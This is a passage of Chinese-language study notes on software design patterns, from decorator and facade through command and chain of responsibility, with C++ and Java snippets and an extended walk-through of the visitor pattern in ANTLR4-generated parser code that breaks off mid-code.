<p>对于每个装饰物来说, 他只需要知道目前套娃什么样, 然后自己套上去,
成为新的套娃</p>
<p>类似的思想也可以用于咖啡点单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(美式)</span><br><span class="line">((美式),加糖)</span><br><span class="line">(((美式),加糖),加冰)</span><br><span class="line">((((美式),加糖),加冰),加糖)</span><br><span class="line">(((((美式),加糖),加冰),加糖),加牛奶)</span><br></pre></td></tr></table></figure>
<p>那么这种模式应该如何表示呢</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412132801382.png"
alt="image-20250409095133753" />
<figcaption aria-hidden="true">image-20250409095133753</figcaption>
</figure>
<p>这里ConcreteComponent就是最初的美式, 也就是套娃的核</p>
<p>然后加糖加冰加牛奶都是Decorator的子类, 每个表示一层套娃</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409112822371.png"
alt="image-20250409112822371" />
<figcaption aria-hidden="true">image-20250409112822371</figcaption>
</figure>
<p>此后如果有新的咖啡，比如卡布奇诺，继承Coffee兵实现toString即可</p>
<p>如果有新的口味，比如椰果，继承Flavour并实现getName即可</p>
<h4 id="外观模式">外观模式</h4>
<p>子系统对外不可见, 由外观类Facade对外提供接口提供访问,
客户不需要关心子系统细节</p>
<p>Facade相当于一个高级代理</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409203910376.png"
alt="image-20250409203910376" />
<figcaption aria-hidden="true">image-20250409203910376</figcaption>
</figure>
<p>外观模式和代理模式的区别:</p>
<p>代理类只对一个实际对象进行代理, 更加专一</p>
<p>但是外观类中管理了很多子系统,
并提供不同方法组合对一个或多个子系统的调用</p>
<p>外观模式可以用在基金和股票场景中</p>
<p>客户是白痴理财人</p>
<p>股票是子系统</p>
<p>基金是外观类</p>
<p>基金经理会挑选几只股票押宝, 不再一棵树上吊死.
对应到外观类可以组合子系统的调用</p>
<p>客户只需要和基金经理打交道, 买入或者卖出.
对应到客户类只需要访问外观类提供的接口</p>
<h4 id="享元模式">享元模式</h4>
<p>享元模式，<code>FlyWeight</code>，实际上是轻量级的意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * a = <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">    <span class="type">char</span> * b = <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">    assert(a == b);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;(<span class="type">size_t</span> *)a&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(<span class="type">size_t</span>*)b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上编译器在rodata段只会生成一个“helloworld”字符串，而不是两个</p>
<p>a和b指针实际上指向相同的内存地址</p>
<p>类似的场景有写时复制：</p>
<p><strong>写时复制</strong>（<strong>Copy-on-write</strong>，简称<strong>COW</strong>）是一种计算机<a
href="https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88">程序设计</a>领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private
copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这过程对其他的调用者都是<a
href="https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%E9%80%8F%E6%98%8E">透明</a>的。此作法主要的优点是如果调用者没有修改该资源，就不会有副本（private
copy）被创建，因此多个调用者只是读取操作时可以共享同一份资源。</p>
<p>享元模式实际上是工厂模式的改进, 工厂会记忆用户的需求</p>
<p>如果相同的需求之前已经满足过了, 那么直接返回之前构建的对象</p>
<p>如果是新需求则创建新对象</p>
<h4 id="代理模式">代理模式</h4>
<p>书上举得这个例子实在不怎么样，别天天折磨人家女娃了，纯人机</p>
<p>意思就是给RealSubject类裹了一层Proxy代理类，代理类实现相同的Request接口</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409151837450.png"
alt="image-20250409151837450" />
<figcaption aria-hidden="true">image-20250409151837450</figcaption>
</figure>
<p>这个代理类在执行Request动作前后可以自己增加pre和post操作</p>
<h3 id="行为型模式">行为型模式</h3>
<p>关注对象之间的通信与交互，解决对象之间的责任分配与算法封装</p>
<h4 id="模板方法模式">模板方法模式</h4>
<p>不变的部分搬到父类</p>
<p>去除子类中的重复代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flavour</span> :</span>public  Component&#123;      <span class="comment">//Decorator</span></span><br><span class="line">    private:</span><br><span class="line">    Component* component;</span><br><span class="line">    public:</span><br><span class="line">    <span class="type">void</span> <span class="title function_">setComponent</span><span class="params">(Component* c)</span>&#123;</span><br><span class="line">        component = c;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Flavour&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str = format(<span class="string">&quot;(&#123;0&#125;),&#123;1&#125;&quot;</span>,component-&gt;toString(),getName());</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ice</span>:</span> public Flavour&#123;</span><br><span class="line">    public:</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Ice&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Milk</span>:</span>public Flavour&#123;</span><br><span class="line">    public:</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Milk&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里getName就是模板方法</p>
<h4 id="观察者模式">观察者模式</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412132737631.png"
alt="image-20250411165606763" />
<figcaption aria-hidden="true">image-20250411165606763</figcaption>
</figure>
<p>发布者-订阅者模式</p>
<h4 id="状态模式">状态模式</h4>
<p>控制一个对象状态转移的表达式<strong>过于复杂时</strong>(如果简单就不需要用状态模式)</p>
<p>将状态判断的if-else逻辑,
转移到表示不同状态的一系列<strong>类中表示</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250418165848590.png"
alt="image-20250412143515765" />
<figcaption aria-hidden="true">image-20250412143515765</figcaption>
</figure>
<h4 id="备忘录模式">备忘录模式</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416165605748.png"
alt="image-20250416165603725" />
<figcaption aria-hidden="true">image-20250416165603725</figcaption>
</figure>
<h4 id="迭代器模式">迭代器模式</h4>
<h4 id="命令模式">命令模式</h4>
<p>命令模式将一个请求封装为一个对象, 对象数组就能模拟请求队列,
可以实现延迟请求, 请求排队</p>
<p>同时, 将请求对象化, 方便了记录请求日志, 对象记录请求内容,
也就支持了撤销操作</p>
<p>Receiver: 实际执行命令的对象</p>
<p>Command: 命令类型父类, Command可以有不同子类定义实际的命令类型</p>
<p>Invoker: 使用Command的入口, 也就是封装命令的对象</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420182349051.png"
alt="image-20250420182347577" />
<figcaption aria-hidden="true">image-20250420182347577</figcaption>
</figure>
<p>如图所示, 这是一个shell命令执行器.</p>
<p>其中Executor就是实际命令执行器, 也就是Receiver,
其execute参数接受一个shell命令字符串, 并调用system函数执行之</p>
<p>Command是命令类型基类, 其getCommand类型汇报自己对应的shell命令,
其execute负责拼接shell命令与参数 ,并交由Executor执行.
Command类中持有一个Executor的引用executor</p>
<p>Invoker是封装的一次命令执行, 在Invoker中设置好参数与对应命令类,
即可在任意时刻调用invoke执行命令</p>
<blockquote>
<p>invoke和call的区别:</p>
<p>两者都用于表示“调用”</p>
<p>call通常指直接的函数调用, 直接使用函数名调用</p>
<p>invoke通常指动态上下文中,使用反射/委托/回调等场景</p>
</blockquote>
<h4 id="职责链模式">职责链模式</h4>
<p>过滤器和拦截器均采用职责链模式</p>
<p>以过滤器为例,
过滤器通常应用于用户权限检查/防止乱码/设置响应编码等场景</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420210150821.webp"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>在javaweb编程中注册一个过滤器非常方便:</p>
<p>1.实现过滤器类</p>
<p>2.在web.xml中注册过滤器映射</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.xzg.cd.LogFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>完美符合开放-封闭原则</p>
<p>看一下时序图, 可以发现各个Filter是递归调用的,
而不是平行地遍历了一遍</p>
<blockquote>
<p>图来自<a
target="_blank" rel="noopener" href="https://www.cnblogs.com/cenyu/p/6200495.html#12过滤器的生命周期">Servlet过滤器
- 洋葱源码 - 博客园</a></p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420212542498.png"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">		FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">	<span class="comment">//prehandler</span></span><br><span class="line">	chain.doFilter(request, response);</span><br><span class="line">       <span class="comment">//posthandler</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UML类图表示为:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420220616312.png"
alt="image-20250420220614007" />
<figcaption aria-hidden="true">image-20250420220614007</figcaption>
</figure>
<p>职责链模式有一个链管理器, 也就是FilterChain, 其中可以有多个职责类,
理想状态下每个指责类只负责一种职责,
比如字符过滤器只负责过滤输入中的危险字符,
大写过滤器只负责将输出中所有小写字符转化成大写</p>
<p>各个职责可以采用递归嵌套, 也可以平行遍历.</p>
<p>但是在Filter这里由于有pre和post两个处理函数, 只能采取递归</p>
<h4 id="中介者模式">中介者模式</h4>
<p>中介者模式通过引入中介者类，将原本模块之间互相调用的关系，
转化为经过中介者沟通的模式， 实现了模块间解耦</p>
<p>房地产交流平台是“房地产中介公司”提供给“卖方客户”与“买方客户”进行信息交流的平台，比较适合用中介者模式来实现。</p>
<p>聊天室中server作为中介者</p>
<p>实际上是星状结构</p>
<h4 id="解释器模式">解释器模式</h4>
<p>再别多说, 给定一个语言, 定义其语法表示, 并定义解释器,
用解释器来解释该语言中的句子</p>
<h4 id="访问者模式">访问者模式</h4>
<p>以Antlr4的实现为例, 学习其访问者模式的实现</p>
<h5 id="访问者模式的作用时机">访问者模式的作用时机</h5>
<p>编译器前端由词法分析器lexer和语法分析器parser组成, 前端的作用时,
输入一段目标语言的源代码, 输出语法树</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source code ====&gt; front end ====&gt; grammer tree</span><br></pre></td></tr></table></figure>
<p>编译器后端就是语义分析, 在antlr4中语义分析可以采用访问者模式 或者
监听者模式实现. 后端的作用是, 输入一个语法树, 进行语义分析,
也就是解释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grammer tree ====&gt; back end ====&gt; semantic analyze</span><br></pre></td></tr></table></figure>
<p>其中visitor就在<code>编译器后端====&gt;语义结果</code>这一步发挥作用</p>
<h5 id="语法树节点结构">语法树节点结构</h5>
<p>那么visitor的参数就是语法树的root节点</p>
<p>所有语法树节点的接口:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ParseTree</span> <span class="keyword">extends</span> <span class="title class_">SyntaxTree</span> &#123;</span><br><span class="line">    ParseTree <span class="title function_">getParent</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    ParseTree <span class="title function_">getChild</span><span class="params">(<span class="type">int</span> childindex)</span>;		<span class="comment">//返回第childindex个子节点的下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setParent</span><span class="params">(RuleContext var1)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; var1)</span>;	<span class="comment">//为了实现访问者模式, 需要每个语法树节点实现accept接口</span></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getText</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">toStringTree</span><span class="params">(Parser var1)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所有语法节点类的抽象父类:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserRuleContext</span> <span class="keyword">extends</span> <span class="title class_">RuleContext</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;ParseTree&gt; children;		<span class="comment">//存放子节点</span></span><br><span class="line">    <span class="keyword">public</span> Token start;</span><br><span class="line">    <span class="keyword">public</span> Token stop;</span><br><span class="line">    <span class="keyword">public</span> RecognitionException exception;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>具体的语法节点类由.g4规则文件给出,
这个g4文件就是人工撰写的词法语法规则文件, 比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">program :  ( statement SEMICO )*  EOF  ;</span><br><span class="line"></span><br><span class="line">statement :  scaleStatment | rotStatment    | forStatment |statColor |statSize |  originStatment|statVar  ;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250421211024147.png"
alt="image-20250421211020863" />
<figcaption aria-hidden="true">image-20250421211020863</figcaption>
</figure>
<p>antlr4会在处理g4文件时,
将<code>program</code>语法对应建立一个<code>ProgramContext</code>语法树节点类</p>
<p>同样<code>statement</code>语法也会建立一个<code>StatementContext</code>语法树节点类</p>
<h5 id="语法树节点的accept接口">语法树节点的accept接口</h5>
<p>在<code>ParseTree</code>接口中规定,
为了能够使用<code>visitor</code>模式,
需要每个语法树节点实现<code>accept</code>接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; var1)</span>;</span><br></pre></td></tr></table></figure>
<p>比如<code>ProgramContext</code>节点类是这样实现的:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ProgramContext</span> <span class="keyword">extends</span> <span class="title class_">ParserRuleContext</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitProgram(<span class="built_in">this</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是直接调用了<code>DrawGraphVisitor.visitProgram()</code></p>
<p>又比如<code>StatScaleContext</code>节点类这样实现:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static class StatScaleContext extends ScaleStatmentContext &#123;</span><br><span class="line">...</span><br><span class="line">	@Override</span><br><span class="line">	public &lt;T&gt; T accept(ParseTreeVisitor&lt;? extends T&gt; visitor) &#123;</span><br><span class="line">		if ( visitor instanceof DrawGraphVisitor ) return ((DrawGraphVisitor&lt;? extends T&gt;)visitor).visitStatScale(this);</span><br><span class="line">		else return visitor.visitChildren(this);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是直接调用了<code>DrawGraphVisitor.visitStatScale()</code></p>
<p>整个过程是这样的:</p>
<p>访问者: 节点, 我能访问你吗? 我应该怎么访问你呢?</p>
<p><code>StateScaleContext</code>节点: 同意访问,
你得去用你的<code>visitStatScale</code>方法来访问我.</p>
<p>为什么访问者不能直接调用自己的<code>visitStatScale</code>方法,
而是先调用节点的accept方法呢?</p>
<p>这是因为, 当访问者来到当前节点家门口时,
访问者并不知道当前节点是个什么具体类型的节点,
访问者只知道节点的多态基类.</p>
<p>因此访问者不知道应该对当前节点进行什么操作,
因此节点需要在自己的accept函数中, 告知访问者访问协议,
也就是由节点指引访问者访问当前节点的方法</p>
<p>那么接下来的问题是,
<code>visitProgram</code>这种具体的访问协议是如何实现的?</p>
<table>
<colgroup>
<col style="width: 7%" />
<col style="width: 30%" />
<col style="width: 43%" />
<col style="width: 17%" />
</colgroup>
<thead>
<tr>
<th>类型</th>
<th>类名</th>
<th>职责</th>
<th>位置</th>
</tr>
</thead>
<tbody>
<tr>
<td>接口</td>
<td>ParseTreeVisitor</td>
<td>声明visit接口, visitChildren接口等</td>
<td>jar库</td>
</tr>
<tr>
<td>抽象类</td>
<td>AbstractParseTreeVisitor</td>
<td>实现visit接口, visitChildren接口等</td>
<td>jar库</td>
</tr>
<tr>
<td>类</td>
<td>DrawGraphBaseVisitor</td>
<td>实现默认的visitStatScale等具体协议</td>
<td>antlr4命令生成</td>
</tr>
<tr>
<td>类</td>
<td>EvalVisitor</td>
<td>自定义visitStatScale等具体协议</td>
<td>程序员撰写</td>
</tr>
</tbody>
</table>
<p><code>DrawGraphBaseVisitor</code>由antlr4自动生成,
其中定义了默认的访问协议方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DrawGraphBaseVisitor</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">AbstractParseTreeVisitor</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">DrawGraphVisitor</span>&lt;T&gt; &#123;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitProgram</span><span class="params">(DrawGraphParser.ProgramContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitStatement</span><span class="params">(DrawGraphParser.StatementContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">    ...</span><br><span class="line">       <span class="meta">@Override</span> <span class="keyword">public</span> Double <span class="title function_">visitStatScale</span><span class="params">(DrawGraphParser.StatScaleContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见默认的方法是直接访问子节点去, 走马观花</p>
<p>真正的访问协议需要程序员撰写,
继承<code>DrawGraphBaseVisitor</code>重写同名函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalVisitor</span> <span class="keyword">extends</span> <span class="title class_">DrawGraphBaseVisitor</span>&lt;Double&gt;</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> Double <span class="title function_">visitStatScale</span><span class="params">(DrawGraphParser.StatScaleContext ctx)</span> &#123;	<span class="comment">//重写visitStatScale函数</span></span><br><span class="line">	    scaleX = visit( ctx.expr(<span class="number">0</span>) );		<span class="comment">//0下标的子节点</span></span><br><span class="line">	    scaleY = visit( ctx.expr(<span class="number">1</span>) );		<span class="comment">//1下表的子节点</span></span><br><span class="line">	    <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="访问者控制流">访问者控制流</h5>
<p>下面跟随访问者的控制流, 看一下accept和visit是如何配合的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BackEnd入口:</span></span><br><span class="line"><span class="type">EvalVisitor</span> <span class="variable">eval</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);		<span class="comment">//这里tree就是语法树的树根节点, 也就是一个programContext节点类</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class AbstractParseTreeVisitor</span></span><br><span class="line">	<span class="keyword">public</span> T <span class="title function_">visit</span><span class="params">(ParseTree tree)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> tree.accept(<span class="built_in">this</span>);			<span class="comment">//多态调用了programContext.accept()</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in class ProgramContext</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">        <span class="comment">//EvalVisitor类没有重写visitProgram()方法, 因此调用了DrawGraphBaseVisitor.visitProgram()</span></span><br><span class="line">        <span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitProgram(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class DrawGraphBaseVisitor</span></span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitProgram</span><span class="params">(DrawGraphParser.ProgramContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="comment">//programContext实际上就是一个statementContext数组, 因此不需要特殊操作, 直接独立地访问子节点statementContext即可</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class AbstractParseTreeVisitor</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">visitChildren</span><span class="params">(RuleNode node)</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.defaultResult();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> node.getChildCount();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n &amp;&amp; <span class="built_in">this</span>.shouldVisitNextChild(node, result); ++i) &#123;</span><br><span class="line">            <span class="type">ParseTree</span> <span class="variable">c</span> <span class="operator">=</span> node.getChild(i);</span><br><span class="line">            <span class="type">T</span> <span class="variable">childResult</span> <span class="operator">=</span> c.accept(<span class="built_in">this</span>);		<span class="comment">//遍历每个子节点, 调用其accept方法</span></span><br><span class="line">            result = <span class="built_in">this</span>.aggregateResult(result, childResult);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    